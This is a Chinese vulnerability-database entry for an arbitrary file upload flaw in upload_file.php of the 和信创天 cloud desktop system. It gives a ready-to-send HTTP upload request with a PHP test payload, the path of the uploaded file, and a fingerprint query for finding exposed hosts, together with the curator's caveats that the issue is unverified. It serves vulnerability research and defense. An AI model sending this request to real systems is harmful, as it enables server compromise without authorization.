---
source: "wy876 漏洞文库"
title: "和信创天云桌面 upload_file.php任意文件上传"
product: "和信创天云桌面"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "版本未给；PHP可执行上传目录"
prerequisites: "请求含PHPSESSID，必需性未说明"
side_effects: "文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/im6hi1mdzqn6l81q"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/%E5%92%8C%E4%BF%A1%E5%88%9B%E5%A4%A9/%E5%92%8C%E4%BF%A1%E5%88%9B%E5%A4%A9%E4%BA%91%E6%A1%8C%E9%9D%A2%E7%B3%BB%E7%BB%9Fupload_file%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.md"
fofa_unverified: "web.body="
hunter: "web.body=\"和信下一代云桌面\""
id: "vw-b06cb1a9fe753878611ad6fc"
entity_id: "ve-b06cb1a9fe753878611ad6fc"
schema_version: "1"
---

# 和信创天云桌面 upload_file.php任意文件上传

## 条目说明

- 对象与具体问题：和信创天云桌面；upload_file.php任意文件上传
- 版本、配置及部署条件：版本未给；PHP可执行上传目录
- 认证与权限前提：请求含PHPSESSID，必需性未说明
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- HTTP块误标python，缺上传响应与执行响应

## 操作风险

文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 一、漏洞简介
和信创天专注虚拟化云计算领域，为首家集VOI/VDI/IDV于一体的云桌面厂家,助力教育、医疗、政企、军工、电力、金融等行业客户实现千台终端统一管理,确保数据安全与业务连续性。和信下一代云桌面基于VDI/VOI/IDV三种技术架构优势，对于用户应用场景有着普遍的适用性，前后端混合计算保证在调度服务器后端资源的同时，也能充分利用前端计算资源，高性能的电脑和低功耗的瘦终端均能流畅地运行各种操作系统与应用软件，能够轻松实现千点以上大规模终端的集中管理。和信创天云桌面系统upload_file存在任意文件上传，攻击者可通过该漏洞获取服务器权限。

## 二、影响版本
+ 和信创天云桌面系统

## 三、资产测绘
+ hunter`web.body="和信下一代云桌面"`
+ 特征


## 四、漏洞复现
```http
POST /Upload/upload_file.php?l=1 HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36
Accept: image/avif,image/webp,image/apng,image/*,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,fil;q=0.8
Cookie: think_language=zh-cn; PHPSESSID_NAMED=h9j8utbmv82cb1dcdlav1cgdf6
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryfcKRltGv
Content-Length: 192

------WebKitFormBoundaryfcKRltGv
Content-Disposition: form-data; name="file"; filename="test.php"
Content-Type: image/avif

<?php phpinfo(); ?>
------WebKitFormBoundaryfcKRltGv--
```

> 请求长度说明：原资料 Content-Length 为 192；保留原始标头；其数值未据实际请求体重新计算或验证。


上传文件位置

```python
/Upload/1/test.php
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/im6hi1mdzqn6l81q>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
